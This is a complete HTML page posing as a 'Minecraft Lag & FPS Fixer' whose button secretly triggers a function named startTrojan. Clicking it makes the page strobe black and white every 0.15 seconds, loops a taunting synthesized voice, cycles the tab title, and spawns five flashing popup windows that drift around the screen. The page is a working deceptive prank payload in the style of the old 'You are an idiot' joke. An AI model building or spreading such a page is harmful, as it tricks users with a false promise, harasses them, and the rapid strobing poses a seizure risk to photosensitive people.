<!DOCTYPE html>
<html lang="el">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Minecraft Performance Fixer</title>
    <style>
        body {
            background-color: #1e1e1e;
            color: white;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }

        /* Κλάση που ενεργοποιείται μετά το κλικ για το αναβόσβημα */
        .troll-mode {
            animation: flash 0.15s infinite alternate !important;
        }

        h1 {
            font-size: 2.5rem;
            text-align: center;
            margin-bottom: 10px;
        }

        p {
            font-size: 1.2rem;
            color: #aaa;
            margin-bottom: 30px;
        }

        .face {
            font-size: 6rem;
            margin-bottom: 20px;
        }

        .face-bounce {
            animation: bounce 0.3s infinite alternate;
        }

        button {
            padding: 20px 40px;
            font-size: 1.5rem;
            font-weight: bold;
            background-color: #55ff55;
            color: black;
            border: none;
            cursor: pointer;
            border-radius: 8px;
            box-shadow: 0 0 15px rgba(85, 255, 85, 0.4);
            transition: 0.2s;
        }

        button:hover {
            background-color: #33cc33;
            transform: scale(1.05);
        }

        @keyframes flash {
            0% { background-color: black; color: white; }
            100% { background-color: white; color: black; }
        }

        @keyframes bounce {
            from { transform: translateY(0); }
            to { transform: translateY(-20px); }
        }
    </style>
</head>
<body id="mainBody">

    <div class="face" id="faceIcon">⛏️</div>
    <h1 id="mainTitle">Minecraft Lag & FPS Fixer</h1>
    <p id="subTitle">Click the button below to optimize your Minecraft client automatically.</p>
    <button id="fixBtn" onclick="startTrojan()">CLICK ME TO FIX YOUR MINECRAFT</button>

    <script>
        function playVoiceSound() {
            if ('speechSynthesis' in window) {
                const speak = () => {
                    const msg = new SpeechSynthesisUtterance("You are an idiot! Ha ha ha ha ha ha!");
                    msg.lang = 'en-US';
                    msg.pitch = 1.4;
                    msg.rate = 1.2;
                    msg.onend = () => {
                        setTimeout(speak, 100);
                    };
                    window.speechSynthesis.speak(msg);
                };
                speak();
            }
        }

        function spawnWindow() {
            const w = 320;
            const h = 220;
            const x = Math.random() * (screen.width - w);
            const y = Math.random() * (screen.height - h);

            let win = window.open("", "", `width=${w},height=${h},top=${y},left=${x}`);
            
            if (win) {
                win.document.write(`
                    <html>
                    <head>
                        <title>YOU ARE AN IDIOT!</title>
                        <style>
                            body {
                                background: black;
                                color: white;
                                font-family: sans-serif;
                                text-align: center;
                                padding-top: 15px;
                                margin: 0;
                                animation: flash 0.15s infinite alternate;
                                overflow: hidden;
                            }
                            @keyframes flash {
                                0% { background-color: black; color: white; }
                                100% { background-color: white; color: black; }
                            }
                        </style>
                    </head>
                    <body>
                        <h1 style="font-size: 55px; margin: 0;">☺</h1>
                        <h2 style="margin: 5px 0;">YOU ARE AN IDIOT!</h2>
                        <h3 style="margin: 0;">HAHAHAHAHA!</h3>
                    </body>
                    </html>
                `);

                let dx = (Math.random() - 0.5) * 30;
                let dy = (Math.random() - 0.5) * 30;

                setInterval(() => {
                    win.moveBy(dx, dy);
                }, 40);
            }
        }

        function startTrojan() {
            // Αλλαγή εμφανισης της κεντρικής σελίδας
            document.getElementById('mainBody').classList.add('troll-mode');
            document.getElementById('faceIcon').innerText = '☺';
            document.getElementById('faceIcon').classList.add('face-bounce');
            document.getElementById('mainTitle').innerHTML = 'YOU ARE AN IDIOT!<br>HAHAHAHAHA!';
            document.getElementById('subTitle').style.display = 'none';
            document.getElementById('fixBtn').style.display = 'none';

            // Αλλαγή τίτλου καρτέλας
            setInterval(() => {
                document.title = document.title === "YOU ARE AN IDIOT!" ? "HAHAHAHAHA!" : "YOU ARE AN IDIOT!";
            }, 150);

            // Φωνή
            playVoiceSound();

            // Άνοιγμα 5 παραθύρων
            for (let i = 0; i < 5; i++) {
                setTimeout(spawnWindow, i * 150);
            }
        }
    </script>
</body>
</html>
